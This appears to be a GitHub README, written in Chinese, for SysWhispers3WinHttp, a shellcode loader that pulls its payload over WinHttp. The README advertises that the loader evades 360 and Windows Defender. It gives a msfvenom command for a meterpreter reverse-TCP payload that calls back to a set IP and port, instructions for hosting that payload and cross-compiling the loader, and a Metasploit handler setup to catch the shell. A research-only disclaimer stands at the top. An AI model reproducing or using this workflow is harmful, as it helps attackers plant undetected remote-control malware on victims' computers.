# SysWhispers3WinHttp
SysWhispers3WinHttp 基于SysWhispers3增添WinHttp分离加载，可免杀360核晶与Defender。

## 0x01 免责声明：

该项目仅供安全研究使用，禁止使用该项目进行违法操作，否则由使用者承担全部法律及连带责任。

## 0x02 使用：

```
// 1. 使用msfvenom生成shellcode（或使用CobaltStrike生成Stageless之Shellcode）
msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.1.110 lport=4444 -f raw -o beacon.bin

// 2. 使用python3开启Web服务（或使用CobaltStrike之HostFile功能）
python3 -m http.server

// 3. 修改SysWhispers3WinHttp.c第40行IP地址并使用Linux32位GCC进行交叉编译
i686-w64-mingw32-gcc -o SysWhispers3WinHttp.exe syscalls.c SysWhispers3WinHttp.c -masm=intel -fpermissive -w -s -lwinhttp
```

## 0x03 演示：

```
msfconsole
msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set payload windows/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 4444
msf6 exploit(multi/handler) > run
```

360核晶截图（2023/04/23更新）
![360](https://user-images.githubusercontent.com/128464183/233817661-76d09fef-7817-4e5a-a236-871c4a300471.PNG)

Defender截图
![WDdemo](https://user-images.githubusercontent.com/128464183/227820977-8ae3dd14-76f4-4076-85a4-91ff2702ec61.PNG)

微步云沙箱截图
![threatbook](https://user-images.githubusercontent.com/128464183/233817665-3ff36fed-ec4e-442f-b837-18247edff7ee.PNG)

## 0x04 参考：
https://github.com/klezVirus/SysWhispers3

https://learn.microsoft.com/zh-cn/windows/win32/api/winhttp/nf-winhttp-winhttpconnect
